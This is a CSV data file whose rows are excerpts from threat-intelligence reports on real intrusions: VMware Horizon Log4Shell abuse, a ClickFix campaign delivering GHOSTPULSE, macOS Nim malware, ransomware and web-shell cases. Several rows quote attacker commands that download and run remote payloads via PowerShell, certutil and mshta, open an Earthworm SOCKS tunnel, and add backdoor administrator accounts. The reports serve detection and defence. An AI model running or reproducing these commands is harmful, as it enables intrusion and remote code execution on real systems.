Column1,Column2
Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe,
"This Centre.exe executable, likely named after the vulnerability, is a renamed “Wallpaper Engine Launcher” from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog",
"This Centre.exe executable, likely named after the vulnerability, is a renamed “Wallpaper Engine Launcher” from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog",
Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe,
"the Centre.exe executable connected to these IP addresses: 104.21.16[.]1 104.21.48[.]1 Threat actors have also been observed performing lateral movement and performing installation of remote access tooling, namely MeshCentral.",
a PowerShell based downloader executed a Cobalt Strike payload that was configured to call back to 185.112.83[.]116 for command and control.iex ((New-Object http://System.Net.WebClient).DownloadString('http://185.112.83[.]116:8080/drv'))At ,
"Detection TipsFor those of you just learning about the mass exploitation of VMware Horizon servers and the installation of backdoor web shells, you should seriously consider the possibility that your server is compromised if it was unpatched and internet-facing. To help you determine your status, we strongly suggest you perform the following actions:Run VMware’s Horizon Mitigation tool to report whether there is a vulnerable Log4J library or child_process based web shell present under the installation location with the following command: Horizon_Windows_Log4j_Mitigation.bat /verboseManually inspect/assess the files within %ProgramFiles%\VMware\VMware View\Server\appblastgateway\ for the presence of the child_process string as pictured here.Review historical records for evidence of node.exe or ws_TomcatService.exe spawning abnormal processes to include PowerShell.",
"Despite mass exploitation of VMware Horizon to deliver web shells, our data suggests today's Cobalt Strike deployments were exploitation of Horizon itself and not the abuse of web shells. This conclusion is largely based on analysis of the PowerShell payload's parent process where web shell abuse spawns from node.exe while exploitation of Log4Shell in Horizon spawns from ws_tomcatservice.exe as pictured.",
" A firewall rule allowing inbound SSH connections Dropped the SSH executable in that folder Persistence in the form of a scheduled task A file called go.bat, which was used to run the following batch scriptWe can briefly dwell on the batch script, which created the reverse shell listener back to the IP we saw in the original script—all while creating persistence in the form of a scheduled task to launch the SSH reverse shell listener so the attacker would always have access to it",
"Spawned under the w3wp.exe (IIS worker process), we observed PowerShell syntax like the following:On other endpoints, we observed certutil commands similar to the following:certutil -urlcache -f http://103.163.187.12:8080/cz3eKnhcaD0Fik7Eexo66A C:\WINDOWS emp\zpvmRqTOsP.exe",
"We observed two infrastructures (both resolving to 50.57.243[.]90) https://clients[.]dealeronlinemarketing[[.]]com/captcha/ and https://clients[.]contology[.]com/captcha/ that deliver the same initial payload. User interaction on this page initiates execution. GHOSTPULSE serves as the malware loader in this campaign. Elastic Security Labs has been closely tracking this loader, and our previous research (2023 and 2024) provided a detailed look into its initial capabilities. The webpage is a heavily obfuscated JavaScript script that generates the HTML code and JavaScript, which copies a PowerShell command to the clipboard. Inspecting the runtime HTML code in a browser, we can see the front end of the page, but not the script that is run after clicking on the checkbox Verify you are human. A simple solution is to run it in a debugger to retrieve the information during execution. The second JS code is obfuscated, but we can easily identify two interesting functions. The first function, runClickedCheckboxEffects, retrieves the public IP address of the machine by querying https://api.ipify[.]org?format=json, then it sends the IP address to the attacker’s infrastructure, https://koonenmagaziner[.]click/counter/, to log the infection. The second function copies a base64-encoded PowerShell command to the clipboard. Which is the following when it is base64 decoded (Invoke-webrequest -URI 'https://shorter[.]me/XOWyT' -UseBasicParsing).content | iex When executed, it fetches the following PowerShell script: Invoke-WebRequest -Uri ""https://bitly[.]cx/iddD"" -OutFile ""$env:TEMP\ComponentStyle.zip""; Expand-Archive -Path ""$env:TEMP/ComponentStyle.zip"" -DestinationPath ""$env:TEMP""; & ""$env:TEMP\crystall\Crysta_x86.exe"" The observed infection process for this campaign involves GHOSTPULSE's deployment as follows: After the user executes the PowerShell command copied by ClickFix, the initial script fetches and runs additional commands. These PowerShell commands download a ZIP file (ComponentStyle.zip) from a remote location and then extract it into a temporary directory on the victim's system. Extracted contents include components for GHOSTPULSE, specifically a benign executable (Crysta_X64.exe) and a malicious dynamic-link library (DllXDownloadManager.dll). This setup utilizes DLL sideloading, a technique in which the legitimate executable loads the malicious DLL. The file (Heeschamjet.rc) is the IDAT file that contains the next stage's payloads in an encrypted format and the file Shonomteak.bxi, which is encrypted and used by the loader to fetch the stage 2 and configuration structure.",
" The ARECHCLIENT2 malware connects to its C2 144.172.97[.]2, which is hardcoded in the binary as an encrypted string, and also retrieves its secondary C2 (143.110.230[.]167) IP from a hardcoded pastebin link https://pastebin[.]com/raw/Wg8DHh2x. Infrastructure analysis The malicious captcha page was hosted under two domains clients.dealeronlinemarketing[.]com and clients.contology[.]com under the URI /captcha and /Client pointing to the following IP address 50.57.243[.]90. We've identified that both entities are linked to a digital advertising agency with a long operational history. Further investigation reveals that the company has consistently utilized client subdomains to host various content, including PDFs and forms, for advertising purposes. We assess that the attacker has likely compromised the server 50.57.243[.]90 and is leveraging it by exploiting the company's existing infrastructure and advertising reach to facilitate widespread malicious activity. Further down the attack chain, analysis of the ARECHCLIENT2 C2 IPs (143.110.230[.]167 and 144.172.97[.]2) revealed additional campaign infrastructure. Both servers are hosted on different autonomous systems, AS14061 and AS14956. ",
"Technical Analysis of installer, GoogIe LLC, and CoreKitAgent Installer The second part of the attack chain begins with the installer binary dropped alongside a by the initial access scripts. Compiled from Nim and weighing in at ~233KB, the installer binary is a universal architecture Mach-O with an ad hoc signature and the identifier user_startup_installer_arm64. The installer binary checks for the existence of a LaunchAgent at [~]/Library/LaunchAgents/com.google.update.plist and creates folder paths at [~]/Library/CoreKit/ and [~]/Library/Application Support/GoogIe LLC/ for use by the later stages described in the following sections. The installer binary prepares the file paths for later stages The misspelling of GoogIe LLC (uppercase ‘i’, not lowercase ‘L’) is intended to help the malware blend in and avoid suspicion.",
" One version of installer uses /private/tmp/cfg (06566eabf54caafe36ebe94430d392b9cf3426ba) while the other uses /private/tmp/.config (08af4c21cd0a165695c756b6fda37016197b01e7). Two versions of the installer binary are identical save for the embedded config file path In both cases, installer checks that the file does not exist, then writes a 0 byte file to the path, setting write-only access (O_WRONLY) on the file. The file path contents are populated by the next stage GoogIe LLC and later read by CoreKitAgent. GoogIe LLC Compiled from Nim and approximately 195KB, the GoogIe LLC executable is a universal Mach-O bearing an ad hoc code signature with the identifier user_startup_loader_arm64. Interestingly, only the filename for this stage uses the typo spoofing trick; the parent folder /Google LLC/ spells Google correctly with a lowercase “L”. ~/Library/Application Support/Google LLC/GoogIe LLC The binary’s primary function is to set up a configuration file and launch the next stage, CoreKitAgent. The GoogIe LLC executable contains hardcoded data that is combined with local environmental data, encoded, and then written out to the config file in /private/tmp. Hardcoded data encrypted and written out to a hidden file /private/tmp/.config The resulting config file contains a 298 byte string of hexadecimal characters. This is later read by CoreKitAgent, which is responsible for writing the LaunchAgent to disk using com.google.update.plist for the Label key and the GoogIe LLC binary for the program argument. The data written to the config file is used as the value for the LaunchAgent’s CLIENT_AUTH_KEY key. The LaunchAgent contains customized Client and Server keys for communication with the C2 The first 47 characters of the value of CLIENT_AUTH_KEY are also identical to the first 47 characters (of the total 86) used for the value of SERVER_AUTH_KEY. When the LaunchAgent is activated by a user login or reboot, GoogIe LLC is launched, which in turn calls CoreKitAgent and the rest of the payload logic. Execution chain once the persistence mechanism is activated by a login or reboot CoreKitAgent Of the four Nim binaries observed, CoreKitAgent is the most technically complex. ",
"Two of these incidents involved attackers that were organized with identical commands, and the other incident was probably still in “research mode.” The attackers’ commands may be seen in the following gist. Loading Gist... The less organized commands pertained of two separate reconnaissance commands: cmd.exe /c whoamicmd.exe /c arp -a What was interesting is that the attacker on the first host seemed to run into some difficulty getting their service to run on the first host with the scripted commands. Since the service didn’t start, they tried the attack again. However, the service still didn’t start despite their best efforts. This was confirmed by examining the System event log, and finding an entry that showed the service failed to start after it was installed: The first attempt at installing the service (Event ID 7045) as illuminated in the event log: [snip] 7045 [snip] [snip] PHP5.3.8 C:\MagicInfo Premium\tomcat\bin\php-cli.exe user mode service auto start LocalSystem [snip] The second attempt at installing the service: [snip] 7045 [snip] [snip] PHP5.3.8 C:\MagicInfo Premium\tomcat\bin\php-cli.exe user mode service auto start LocalSystem The service fails to start, shown by Event ID 7000: [snip] 7000 [snip] [snip] PHP5.3.8 %%2 UABIAFAANQAuADMALgA4AAAA # translates to PHP5.3.8 [snip] For the second host, there was only one entry that showed that the service was installed, and there was no entry showing that it failed. There was also proof of execution of the downloaded binaries from EDR data showing the service running. Figure 1: An overview of the three attacks, in meme form Another curious thing about the attackers’ commands was the fact that while they pulled an executable that was originally named srvany.exe from their staging website, they appeared to have named it as php-cli.exe on the victim’s machine. They downloaded an executable named php_cli.exe, and renamed it as php-fpm.exe i",
"A Recent ExampleHuntress analysts recently detected an incident that was likely the result of a phishing email. A seemingly innocent zipped archive was found in the user’s Downloads folder, which was named for a potential customer and contained information related to tax issues. Further review of the user’s Downloads folder indicated that they regularly received zipped archive files pertaining to tax forms, tax issues, W2 forms, etc., as part of their business role within the customer’s organization. The archive contained two files, my tax.mp4 and a Windows shortcut file, illustrated in Figure 1, named tax_file.Figure 1: “Tax_file” Windows shortcut/LNK fileAt this point, all indications are that the user expects to receive zipped archives containing files related to taxes, meaning that so far, nothing appears to be amiss and no alarm bells are ringing yet. The command embedded within the Windows shortcut file is obfuscated, and launches PowerShell with the following arguments:. $env:C:\W*\S*2\m*h?a.* 'https[:]//transfer.sh/get/RzbMK13oyI/p.hta'When executed on the system, the command appears as follows:""C:\Windows\System32\Mshta.exe"" https[:]//transfer.sh/get/RzbMK13oyI/p.htaHuntress detects this as “MSHTA Downloading Remote Payload”.The execution of the HTA file leads to the creation of a BITS Client job to download and execute a batch file (file containing a list of commands), which Huntress detects as “Suspicious BITSAdmin Commonly Abused Directories”.The batch file contents appear as follows:@echo offset url=https://transfer.sh//mail.zipset url2=https://transfer.sh//W2.pdfpowershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri %url2% -OutFile %temp%\W2.pdf""cd %temp%start W2.pdfpowershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri %url% -OutFile %temp%\mail.zip""powershell -WindowStyle Hidden -Command ""Expand-Archive -Path %temp%\mail.zip -DestinationPath %temp%\mail -Force""cd %temp%\mailstart mail.com Huntress detects the two PowerShell commands for downloading files as “Suspicious Download Via Transfer.sh”. ",
"ansomware Deployment AttemptsOn both endpoints, the initial ransomware deployment started with a DOS batch file run from the user’s desktop:C:\Users\user\Desktop\PP.batThis batch file, in turn, ran the following rundll32.exe command:rundll32 C:\Users\user\Desktop\LB3_rundll32_pass.dll,gdll -pass <32-char password>The ransomware impact on endpoint A was not simply limited, but limited to just that endpoint. However, on endpoint B, installed security software inhibited the threat actor’s progress and required them to make alternate attempts to encrypt files on the endpoint. Following log messages indicating that the above DLL file was quarantined, the threat actor made several attempts to launch the following file before it was quarantined by security software:C:\Users\user\Desktop\LB3.exeInstalled security software quarantined the following file before any apparent attempt to execute it:C:\Users\user\Desktop\ZZZZZZZAfter this point in the logs, no additional threat actor activity was observed during the login session.",
"The Huntress SOC team flagged a user Run Key value with the name “xmNusBQH4865,” which in and of itself was suspicious. The command executed was equally suspect:Regsvr32.exe /s C:\programdata\xmNusBQH4865.dllAs for the DLL payload, we cross-referenced its hash in VirusTotal and discovered it hadn’t been seen before:",
"Initial access to target networks is accomplished by exploiting a vulnerability, likely an SQL injection flaw, after which PowerShell is used to deliver additional tools hosted on a staging server (""868id[.]com""). ""This conjecture is supported by our observation that most unauthorized PowerShell executions originated from the binary sqlserver.exe, which holds a stored procedure xp_cmdshell that can be used to execute commands on a machine,"" ESET said. Rungan is designed to await incoming requests from a URL matching a predefined pattern (i.e., ""https://+:80/v1.0/8888/sys.html""), and then proceeds to parse and execute the commands embedded in them.",
"Host Reconnaissance After obtaining the key server configuration files, the threat actor proceeded to fingerprint the compromised server through host and network reconnaissance, including but not limited to enumerating running processes, services, user accounts, TCP/IP configurations, and active network connections.whoami hostname net user tasklist ipconfig /all tasklist /svc netstat -ano nslookup net group domain admins net localgroup administratorsStaging Directory The threat actor leveraged public directories such as Music and Video for staging and deploying their tooling. Files written into the Public directory include: File: C:\Users\Public\Music\7za.exe ",
"In one instance where the file 1.vbs was retrieved, it contained a simple VBS code to launch the EARTHWORM. Set shell = CreateObject(""WScript.Shell"") shell.CurrentDirectory = ""C:\Users\Public\Music"" shell.Run ""ufp.exe -s rssocks -d 130.33.156[.]194 -e 443"", 1, False ",
"The threat actor leveraged a privilege escalation tool to create the local administrator account, asp$. The naming convention mimicking an ASP.NET service account with a common suffix $ suggests an attempt to blend in and evade detection. ""C:\Users\Public\Music\helper.exe"" ""net user asp$ {REDACTED} /add"" ""C:\Users\Public\Music\helper.exe"" ""net localgroup administrators asp$ /add"" sawadmin: At a later stage, the threat actor established a DWAGENT remote session to create a second local administrator account. net user sawadmin {REDACTED} /add net localgroup administrators sawadmin /addProcess Token Theft Attempt The threat actor was observed executing a binary named GoToken.exe under the context of sawadmin with the following command-line arguments:GoToken.exe -h GoToken.exe -l GoToken.exe -ah GoToken.exe -tWhile Mandiant was unable to recover the GoToken.exe binary from the server, the filename and arguments strongly suggest it is the public Go-based token-stealing tool GoTokenTheft. This tool is designed to execute commands using the security context of other users on a system.",
